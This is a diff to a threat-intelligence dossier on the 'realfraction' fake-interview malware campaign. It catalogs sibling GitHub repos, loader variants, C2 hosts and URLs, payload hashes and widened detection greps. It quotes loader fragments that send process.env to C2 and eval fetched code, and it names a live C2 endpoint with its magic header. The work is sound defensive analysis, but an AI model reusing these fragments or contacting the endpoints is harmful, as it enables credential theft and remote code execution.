@@ -262,9 +262,11 @@ Recording the response (including TLS certificate chain, response headers, and f
 
 A targeted cluster-expansion sweep was performed from this sandbox, seeded on the distinctive strings in the loader (C2 host, C2 path, magic header, eval primitive paired with the magic header) and on the distinctive contract names in the Solidity tree (`FractionalPropertyToken`, `FractionalPropertyFactory`, `RealFractionToken`, `PropertyNft`, `RentalManager`, `RealFraction` brand). Findings:
 
-- **One sibling repo identified: `ChainVisitaTech/realfraction-mvp`.** A second GitHub repo carrying the same RealFraction MVP codebase under a different owning org. Identified via Google search results that quote the exact same README opening line (`"RealFraction is a blockchain-powered smart real estate platform"`) and the same Solidity contract names. Both the `ChainVisitaTech` org page and the `ChainVisitaTech/realfraction-mvp` repo currently return **HTTP 404** — either the operator has pulled them, GitHub Trust & Safety has already actioned them, or the org has been renamed. Confidence: **medium-high** that this is a same-codebase sibling instance; **loader presence in that specific repo could not be directly verified** because the contents are no longer fetchable. The 404 status is itself a meaningful signal — a single-purpose org with identical-codebase to a confirmed-malicious sibling, where the repo has disappeared between indexing and re-fetch.
-- **No additional GitHub orgs / users identified.** The campaign's broader sibling expansion was bounded by limitations of this sandbox (see §7.3) — authenticated GitHub code search is not available, so the AjunaVerse-incident-style sweep (which identified ~15 siblings via authenticated code-search hits on the distinctive strings) could not be replicated for the realfraction-family fingerprints. The catalogued footprint of two repos (one live, one 404) is therefore a **lower bound** on operator activity rather than a complete census.
-- **No public C2-hostname hits via Google.** A site-restricted search for `"ipregionchecker.com" site:github.com` returns zero relevant hits. Either the C2 host is exclusive to this generation of the campaign and hasn't been independently reported yet, or its appearance is camouflaged by the search engine's tokenization rules. Combined with the search engine still having indexed `ChainVisitaTech/realfraction-mvp` despite it being 404, the campaign appears to be **fresh** rather than long-tail.
+- **One sibling repo identified at original-analysis time: `ChainVisitaTech/realfraction-mvp`.** A second GitHub repo carrying the same RealFraction MVP codebase under a different owning org. Identified via Google search results that quote the exact same README opening line (`"RealFraction is a blockchain-powered smart real estate platform"`) and the same Solidity contract names. Both the `ChainVisitaTech` org page and the `ChainVisitaTech/realfraction-mvp` repo returned **HTTP 404** from the original sandbox. **Update (2026-05-18 cluster-expansion sweep):** the org was **renamed** to `chainvisita-protocols`, not removed. The successor repo at `chainvisita-protocols/realfraction-mvp` is **live**, and its `server/utils/regionChecker.js` is byte-identical to `realfraction/realfraction`'s except for the C2 URL suffix (`3aeb34a38` vs `3aeb34a31`). **Loader presence confirmed via direct fetch.** Confidence upgraded from medium-high to **high**. See §7.5 for the full cluster catalog.
+- **No additional GitHub orgs / users identified at original-analysis time.** The original sandbox's egress policy blocked authenticated GitHub code search, so the AjunaVerse-incident-style sweep could not be replicated. The catalogued footprint of two repos was a **lower bound**.
+- **No public C2-hostname hits via Google at original-analysis time.** A site-restricted search for `"ipregionchecker.com" site:github.com` returned zero relevant hits.
+
+**Update (2026-05-18 cluster-expansion sweep):** Both bounds are now lifted. The authenticated GitHub code search has been run with the full search-seed set listed in the engagement brief. The catalog has grown from **2 repos** to **27+ confirmed sibling repos** across **4 C2 hosts** and **8 distinct loader-file/idiom sub-shapes** (A–H), summarized in §7.5 below.
 
 ### 7.2 Committer identities: author re-attribution at fork-import
 
@@ -292,11 +294,11 @@ The cluster-expansion search from this sandbox was constrained by network egress
 
 What was available: the unauthenticated GitHub UI (which is enough to read public repo files via `raw.githubusercontent.com` and to view individual profile/repo pages), Google web search via `WebSearch`, and the GitHub MCP tools scoped to the dossier repo. Within those bounds the expansion identified the one sibling instance described in §7.1; a replication of this analysis from an environment with authenticated GitHub code search would very likely find more.
 
-### 7.4 Catalog impact
+### 7.4 Catalog impact (original pre-sweep analysis)
 
 This incident affects the dossier's cluster catalog in three ways:
 
-1. **A new lure-theme + loader-idiom pair.** Real-estate-tokenization is already in the catalog as an AjunaVerse-family earlier-generation lure (`dappfusion/defi-real-estate`, `InvescoHub/defi-real-estate`). `realfraction` is the same lure theme with a different loader generation. Whether the catalog should fold `realfraction` in as a sibling of the AjunaVerse cluster, or treat it as a parallel "Contagious Interview" sub-cluster, depends on whether any operator-overlap signals emerge (commit-author emails, GitHub numeric ID adjacency, bit-identical artifacts). None observed so far.
+1. **A new lure-theme + loader-idiom pair.** Real-estate-tokenization is already in the catalog as an AjunaVerse-family earlier-generation lure (`dappfusion/defi-real-estate`, `InvescoHub/defi-real-estate`). `realfraction` is the same lure theme with a different loader generation. Whether the catalog should fold `realfraction` in as a sibling of the AjunaVerse cluster, or treat it as a parallel "Contagious Interview" sub-cluster, depends on whether any operator-overlap signals emerge (commit-author emails, GitHub numeric ID adjacency, bit-identical artifacts). None observed so far. *(Superseded — see §7.10 below; the 2026-05-18 cluster-expansion sweep observed three forms of operator overlap.)*
 
 2. **The diagnostic grep is too narrow.** The existing top-level diagnostic grep (`new Function\(["']require["'],|verify\(setApiKey|x-app-request|"runOn":[[:space:]]*"folderOpen"`) misses every realfraction-style instance. A widened grep that catches both families:
 
@@ -306,7 +308,7 @@ This incident affects the dossier's cluster catalog in three ways:
      --exclude-dir=node_modules --exclude-dir=.git .
    ```
 
-   The `https.request(...).end()` and `eval(data)` matchers will produce some false positives on legitimate fire-and-forget HTTPS and on legitimate `eval(data)` use, but a single hit on either still warrants reading the file in question — both are uncommon in normal application code.
+   The `https.request(...).end()` and `eval(data)` matchers will produce some false positives on legitimate fire-and-forget HTTPS and on legitimate `eval(data)` use, but a single hit on either still warrants reading the file in question — both are uncommon in normal application code. *(Further widened post-sweep — see §7.10 for the current grep.)*
 
 3. **Search seeds for sibling-repo hunting via GitHub code search.** Three distinctive strings to seed cluster hunts:
 
@@ -314,7 +316,133 @@ This incident affects the dossier's cluster catalog in three ways:
    - `/api/ip-check-encrypted/` — the C2 path prefix. The `3aeb34a31` suffix may rotate.
    - `x-secret-header` paired with `eval(data)` in the same file — a behavioral fingerprint.
 
-   GitHub code search hits on any of these from outside the cloned repo would identify additional cluster members. (Not performed in this analysis, as this sandbox's GitHub MCP server is restricted to the dossier repo by policy.)
+   GitHub code search hits on any of these from outside the cloned repo would identify additional cluster members. (Not performed in this analysis, as this sandbox's GitHub MCP server is restricted to the dossier repo by policy.) *(Performed post-sweep — results in §7.5.)*
+
+### 7.5 Confirmed sibling repos (2026-05-18 cluster-expansion sweep)
+
+The authenticated GitHub code search produced hits on every distinctive string fingerprint listed in the engagement brief (`ipregionchecker.com`, `regionCheckApi`, `x-secret-header`, and the lure-brand contract names). Each candidate file was fetched via `raw.githubusercontent.com` and confirmed to contain a realfraction-family loader before inclusion in the catalog below.
+
+The loaders cluster into **eight sub-shapes** that all share the magic header `x-secret-header: secret` but vary in:
+
+- **file path** of the loader (regionChecker.js / paymentController.js / complianceService.js / mock/users.js / settingController.js / utils/redis.js / constants/index.js / department-error.js / etc.),
+- **RCE primitive** (`eval(data)` / `eval(response.data)` / `new Function.constructor("require", errCode)`),
+- **transport** (`https.request` / `axios.post` / `axios.get`),
+- **whether `process.env` is exfiltrated at loader stage** (no for A/B/C/G/H; **yes** for D/E/F — a hybrid that adopts the AjunaVerse-family env-exfil behavior),
+- **trigger** (require-side-effect / explicit init call from server entrypoint / IIFE on module load), and
+- **C2 host** (`ipregionchecker.com` / `isillegalregion.com` / `cookie-xi-seven.vercel.app` / `ip-check-api.vercel.app`).
+
+The sub-shapes catalog:
+
+| Sub-shape | Loader file | RCE primitive | Transport | env exfil | C2 host(s) | Confirmed repos |
+|---|---|---|---|---|---|---|
+| **A** — regionChecker side-effect | `server/utils/regionChecker.js` | `eval(data)` | `https.request POST` (hardcoded URL) | no | `www.ipregionchecker.com` | `realfraction/realfraction` · `chainvisita-protocols/realfraction-mvp` |
+| **B** — inline paymentController | `server/controllers/paymentController.js` | `eval(data)` | `https.request POST` (hardcoded URL); **NOTE missing `.end()` — request never fires on the wire** | no | `www.isillegalregion.com` | `slobodanmargetic988/real-world-assets` |
+| **C** — stockx complianceService | `backend/src/compliance/complianceService.js` (called from `backend/src/index.js`) | `eval(response.data)` | `axios.post` (config-driven, `IPCHECK_URL` env-overridable); **NOTE bug — headers in 2nd positional arg so `x-secret-header` not actually emitted on the wire** | no (but `axios.post` 2nd arg is the headers object misplaced into body position) | `www.ipregionchecker.com` (suffix `3aeb34a37`) | `LandinLin/stockx_poc_1.03` · `devcode8/stock-home-assignment` · `0xbrentfi/StockX_PoC_1.03` · `Chainbits1/StockX` · `Lynqex-Labs/Stockx_PoC_v3` |
+| **D** — mock/users verify | `server/mock/users.js` | `eval` (per caller) | `axios.post(api, { ...process.env }, { headers: {...} })` | **yes** | per repo | `metapulse54/RealEstateDemo` · `RockTxoi/DeFi-Estate` · `jaiu3d/DeFi-Estate` · `kio87j/DeFi-Estate` · `ricardomartins9899/SmartPay-Demo` |
+| **E** — settingController verify (cross-gen) | `app/controllers/settingController.js` | `eval` (per caller) | `axios.post(api, { ...process.env }, { headers: {...} })` | **yes** | per repo | `BVSLabs/blockchain-voting-system` · `Cortexa-org/NitroGem`. **Also present on AjunaVerse-earlier-catalog repos:** `jamesm-dev/NitroGem` · `prahaladbelavadi/CoinLocatorDemo` · `sky-cook/tokentradingdapp` · `artemus-jarrett/blockchain-voting-system` · `dappfusion/defi-real-estate` · `InvescoHub/defi-real-estate` · `TechByteX/NitroGem` (cross-generation — these repos carry both the AjunaVerse-earlier loader at `app/controllers/frontController.js` and the realfraction-family loader at `app/controllers/settingController.js`) |
+| **F** — redis.js verify | `backend/src/utils/redis.js` | `eval` (per caller) | `axios.post(api, { ...process.env }, { headers: {...} })` | **yes** | per repo | `eastmade/web3project-momo-token` · `MBhatti26/Purrtal` |
+| **G** — constants+loader template | `backend/src/constants/index.js` (constants) + loader fetch+eval elsewhere in the same repo | `eval` / `Function.constructor` (varies) | `axios.get`/`post` against `cookie-xi-seven.vercel.app/api/ipcheck-encrypted/6KDisdfjlskjDI837KJH4` | varies | `cookie-xi-seven.vercel.app` (currently **DEPLOYMENT_DISABLED** by Vercel) | `fabiolin/schoolmgmt` · `sharmapranay38/new_age_blockchain` · `shri33/Crypto-Trading-Platform` (sub-shape G/H hybrid) · `Paulooo0/go-test` · `KagiyamaWeb/PyPDFMicroservise` · `Wilovy09/deby-assignment` · `pablodiaz2799/solice-skill-test` |
+| **H** — Function.constructor + ip-check-api | `backend/src/modules/departments/department-error.js` | `new Function.constructor("require", errCode)` | `axios.get` against `ip-check-api.vercel.app/api/ipcheck-encrypted/3948uf2uhe9r298rh2` | no | `ip-check-api.vercel.app` (currently **DEPLOYMENT_DISABLED** by Vercel) | `Jay-Sojitra/student-management-system` · `sparsh-kr24/Student-Management-System` · `ahmedraza90/test-fullstack` |
+
+Three observations on the cross-cuts:
+
+- **Sub-shape H's RCE primitive is the AjunaVerse-family primitive.** `Function.constructor === Function`, so `new Function.constructor("require", errCode)` is morally identical to `new Function("require", code)` — exactly the AjunaVerse-family RCE. The realfraction-family magic header is paired with the AjunaVerse-family RCE primitive. Operator code-sharing across what we previously catalogued as separate generations is now visible at the source level. This also means the dossier's existing diagnostic grep, which targets `new Function\(["']require["']`, **does not catch sub-shape H** — the `.constructor` indirection evades it. The widened grep in [`detection-rules.md`](./detection-rules.md) §3 catches both forms.
+- **Sub-shapes D/E/F adopt the AjunaVerse-family env-exfil-at-loader-stage behavior.** They POST `{...process.env}` as the request body — same as AjunaVerse-family `axios.post(api, { ...process.env }, ...)`. So the dossier's earlier claim that "realfraction loader does NOT POST `process.env`" is **only true of sub-shape A** (and sub-shape B, which has a different bug that prevents the wire request from firing at all). The hybrid sub-shapes D/E/F do exfil `process.env` at loader stage.
+- **Sub-shape E confirms cross-generation operator code-sharing.** Seven existing AjunaVerse-earlier-catalog repos carry both loaders. That makes them dual-loader repos, not just one-loader-per-generation. From a defensive perspective, this means scanning a candidate repo for the AjunaVerse-family fingerprint alone is insufficient; the realfraction-family `x-secret-header` fingerprint can appear in the same repo at a different file path.
+
+### 7.6 Live C2 probe — payload retrieved from isillegalregion.com
+
+A live POST to `https://www.isillegalregion.com/api/ip-check-encrypted/3aeb34a39` with `x-secret-header: secret` from a researcher IP returned **HTTP 200 with a 2,914,396-byte JavaScript body** (Content-Type `text/html; charset=utf-8`; Server `Vercel`; `x-vercel-id: fra1::iad1::...`). The body is single-line obfuscator.io-style obfuscated JavaScript (object-property obfuscation with hex constants and a string-table indirection) — i.e., the stage-2 payload, not the `blocked` / `{blocked:true}` negative-gate sentinel.
+
+The payload was **not executed**. It was captured to `/tmp/realfraction-probe/b-isillegal.bin` and its hashes/size recorded:
+
+- SHA-256: `dbd065a1e8d525acf81428bf131240e7ffd2913538052387f83fe3df83659ee0`
+- SHA-1: `86e37eaf7bc89897981cbefd0c979c002aa6b938`
+- Size: 2,914,396 bytes (~2.85 MB)
+
+Two interpretations of "payload served to a researcher IP":
+
+- **Most likely**: the operator's IP allowlist on this deployment is broad (or simply not configured at all) — sub-shape B's loader is the buggy one that doesn't actually fire on the wire (missing `.end()`), so the operator may have considered IP-gating less important here, or the deployment never received gating logic before being staged for active use.
+- **Less likely**: the researcher IP is in the operator's allowlist by coincidence (e.g., shared subnet with a prior victim).
+
+Either way, the stage-2 payload is now captured for separate offline reverse-engineering. The `isillegalregion.com` deployment is **still serving** as of 2026-05-18 07:40 UTC — Vercel has not yet taken it down (in contrast to `cookie-xi-seven.vercel.app` and `ip-check-api.vercel.app`, both of which return `HTTP 451 x-vercel-error: DEPLOYMENT_DISABLED`). It is the top-priority Vercel takedown target for this incident — see [`abuse-report-vercel.md`](./abuse-report-vercel.md).
+
+For the original C2 `www.ipregionchecker.com`: DNS still returns empty because **the apex is on registrar `client hold`** at Unstoppable Domains (set 2026-05-07 per RDAP). The domain itself is frozen — likely already actioned by the registrar following an earlier abuse report. The status is `client hold` + `client delete prohibited` + `client transfer prohibited` + `client update prohibited`, which prevents the operator from re-pointing it. Static-blocklist value remains; live-reachability value does not.
+
+### 7.7 Vercel hosts the realfraction-family C2 infrastructure
+
+Three of the four known realfraction-family C2 hosts are Vercel deployments:
+
+| Host | Hosting | Status (2026-05-18) | IPv4 |
+|---|---|---|---|
+| `www.ipregionchecker.com` | Unstoppable Domains DNS (apex on client hold; not on Vercel) | registrar-frozen | (no resolution) |
+| `www.isillegalregion.com` | Vercel (`ns1.vercel-dns.com` / `ns2.vercel-dns.com`) | **live; serving stage-2** | 64.29.17.65 / 216.198.79.1 |
+| `cookie-xi-seven.vercel.app` | Vercel | **DEPLOYMENT_DISABLED** (already actioned) | 64.29.17.3 / 216.198.79.3 |
+| `ip-check-api.vercel.app` | Vercel | **DEPLOYMENT_DISABLED** (already actioned) | 64.29.17.3 / 216.198.79.3 |
+
+This contradicts the original case file's claim that the realfraction-family is non-Vercel — that claim was based on the apex `ipregionchecker.com` not appearing to be Vercel-hosted, but the renamed sibling `isillegalregion.com` and the two `.vercel.app` deployments make Vercel the **predominant** hosting platform for this generation. A Vercel abuse filing is therefore in-scope for this incident. See [`abuse-report-vercel.md`](./abuse-report-vercel.md).
+
+For the live `isillegalregion.com` deployment, the appropriate takedown path is twofold:
+
+- **Vercel abuse desk** — to disable the deployment behind the domain.
+- **Registrar abuse desk (Name.com)** — to revoke the `isillegalregion.com` domain itself so the operator can't re-point it at a different host.
+
+Both are in-scope. See [`abuse-report-vercel.md`](./abuse-report-vercel.md) and [`abuse-report-registrar.md`](./abuse-report-registrar.md).
+
+### 7.8 Operator-account classification
+
+Owners of confirmed sibling repos partition cleanly into three groups:
+
+- **Operator-owned (suspend)** — small, recently-created orgs or single-purpose user accounts whose repo list is overwhelmingly campaign-shape:
+  - Orgs: `realfraction` · `chainvisita-protocols` · `Chainbits1` · `Lynqex-Labs` · `metapulse54` · `RockTxoi` · `jaiu3d` · `kio87j` · `BVSLabs` (with `chainvisita-protocols` and `Lynqex-Labs` additionally exhibiting the **credibility-farming TTP** — forking ~5–11 well-known crypto/blockchain projects on the same day the org was created to pad the public profile).
+  - Users: `Cortexa-org` (despite the `-org` suffix this is a User account; multi-lure-theme persona spanning `NitroGem` + `EHR-Demo` + `intelhealthcare` + `Neura-MVP`) · `0xbrentfi`.
+  - Uncertain-leans-operator: `ricardomartins9899` · `sparsh-kr24` (both single-repo accounts but with creation dates older than the typical operator-throwaway window).
+
+- **Likely compromised legitimate / candidate-fooled (investigate, don't suspend)** — accounts with substantial real-developer history (multi-year, multi-language, multi-domain repos) where a single realfraction-family repo appears:
+  - `slobodanmargetic988` · `LandinLin` · `devcode8` · `eastmade` · `MBhatti26` · `fabiolin` · `sharmapranay38` · `shri33` · `Paulooo0` · `KagiyamaWeb` · `Wilovy09` · `pablodiaz2799` · `Jay-Sojitra` · `ahmedraza90`.
+
+  The "compromised" framing in the existing dossier conventions fits the *outcome* (a malicious repo appears on the account); the more likely *mechanism* in this cohort is that these users are real candidates who completed a take-home assignment from the operator and then publicly pushed the resulting (loader-embedded) codebase to their own GitHub account. That is also why so many of these accounts have one malicious repo amidst dozens of unrelated personal projects.
+
+- **Real developers named in trojan-commit authorship but not operator-controlled** — `urmybestfriend` · `cncolder` · `hinchley2018` · `danbovey`. Already covered in §7.2. The operator forked a legitimate scaffold and either preserved or re-attributed commits to these handles.
+
+The signal codes (A · S · C) the dossier uses for justifying operator-owned classifications, and per-org details (numeric IDs, creation dates, sibling-creation patterns), are in [`iocs.json`](./iocs.json) under `github.organizations` and `github.users`. The same data drives the filing checklist in [`abuse-report-github.md`](./abuse-report-github.md).
+
+### 7.9 New IOCs added to the dossier
+
+Summary of what's new in [`iocs.csv`](./iocs.csv) / [`iocs.json`](./iocs.json) from this sweep:
+
+- **Domains**: `www.isillegalregion.com` + apex (Name.com / Vercel; **live**), `cookie-xi-seven.vercel.app` (DEPLOYMENT_DISABLED), `ip-check-api.vercel.app` (DEPLOYMENT_DISABLED). Plus the registrar/nameserver context for `www.ipregionchecker.com` (Unstoppable Domains, client hold) and the lure-brand `realfraction.xyz` (Namecheap).
+- **IPv4**: `64.29.17.65`, `216.198.79.1` (Vercel edge for isillegalregion.com); `64.29.17.3`, `216.198.79.3` (Vercel edge for the two disabled deployments); `162.255.119.72` (Namecheap parking for realfraction.xyz).
+- **URLs**: full C2 endpoint for each sub-shape with the per-instance suffix (`3aeb34a31` / `3aeb34a37` / `3aeb34a38` / `3aeb34a39` for sub-shapes A/C/A/B respectively; `6KDisdfjlskjDI837KJH4` for sub-shape G; `3948uf2uhe9r298rh2` for sub-shape H).
+- **Code patterns**: the new RCE primitive `new Function.constructor("require", errCode)`; the env-exfil-at-loader-stage `axios.post(api, { ...process.env }, { headers: { "x-secret-header": "secret" } })`; the buggy `axios.post(api, { headers: ... })` variant; the distinctive sub-shape G constants template.
+- **HTTP headers**: `x-vercel-error: DEPLOYMENT_DISABLED` (observed on the two disabled deployments — corroborating signal that a known C2 has been taken down); `Server: Vercel` (on the live `isillegalregion.com` host).
+- **Hashes**: the stage-2 payload SHA-256 / SHA-1 / size (see §7.6).
+- **GitHub entities**: 9 new operator-owned orgs (excluding the renamed `ChainVisitaTech` → `chainvisita-protocols`), 2 operator-owned users, 2 uncertain-leans-operator users, 14 likely-compromised-legitimate users, 27 confirmed sibling repos (plus 3 inferred siblings on confirmed-operator-owned accounts).
+
+### 7.10 Catalog impact (post-sweep update)
+
+After the 2026-05-18 cluster-expansion sweep, the §7.4 conclusions are updated as follows:
+
+1. **The realfraction-family is no longer separate from the AjunaVerse-family at the operator level — they overlap.** Three independent overlap signals from §7.5 confirm this:
+   - **Sub-shape H's RCE primitive `new Function.constructor("require", errCode)` is the AjunaVerse-family RCE primitive** (`Function.constructor === Function`), paired with the realfraction-family magic header.
+   - **Sub-shape E (`app/controllers/settingController.js`) appears in seven existing AjunaVerse-earlier-catalog repos** as a second loader alongside the AjunaVerse-earlier loader in `frontController.js`. These are dual-loader repos.
+   - **Vercel hosting is shared** between AjunaVerse-family C2s and three of the four realfraction-family C2s.
+
+   The two families should be treated as **branches of a single operator's loader toolkit**, not as separate clusters. The catalog continues to label them by their distinctive magic header (`x-app-request: ip-check` vs `x-secret-header: secret`) because that's the cleanest defensive distinction, but campaign attribution treats them as one operator.
+
+2. **The diagnostic grep needs another widening pass.** The previous widening was insufficient — sub-shapes G and H were missed. The current widest grep that catches all known fingerprints across both families:
+
+   ```
+   grep -RIn -E \
+     'new Function(\.constructor)?\(["'\'']require["'\''],|verify\(setApiKey|x-app-request|x-secret-header|"runOn"[[:space:]]*:[[:space:]]*"folderOpen"|ipregionchecker\.com|isillegalregion\.com|cookie-xi-seven\.vercel\.app|ip-check-api\.vercel\.app|ipcheck-encrypted|ip-check-encrypted' \
+     --exclude-dir=node_modules --exclude-dir=.git .
+   ```
+
+   See [`detection-rules.md`](./detection-rules.md) §3 for the canonical version (kept in sync with the rules YARA / Sigma).
+
+3. **Sibling-repo hunting is no longer a TODO.** The sweep has been run; the catalog is in §7.5. Further hunts are useful if and when the operator rotates infrastructure — the recommended re-hunt seeds are listed in §7.5's sub-shape table (C2 hosts, API-key tokens, RCE-primitive patterns).
+
+4. **The realfraction-family is materially larger than the dossier reflected before this sweep.** Pre-sweep: 1 confirmed repo + 1 unverified sibling. Post-sweep: 27+ confirmed repos in 8 sub-shapes across 4 C2 hosts and ~11 operator-owned orgs/users. The cluster remains in this single incident folder (per the user's "default to keeping everything in one folder unless volume forces a split" guidance) — but if the operator rotates loader idioms again, the next sweep should reconsider whether a `2026-05-18-realfraction` / `2026-05-18-realfraction-stockx` / `2026-05-18-realfraction-skilltest` per-sub-cluster split would aid navigation.
 
 ---
 
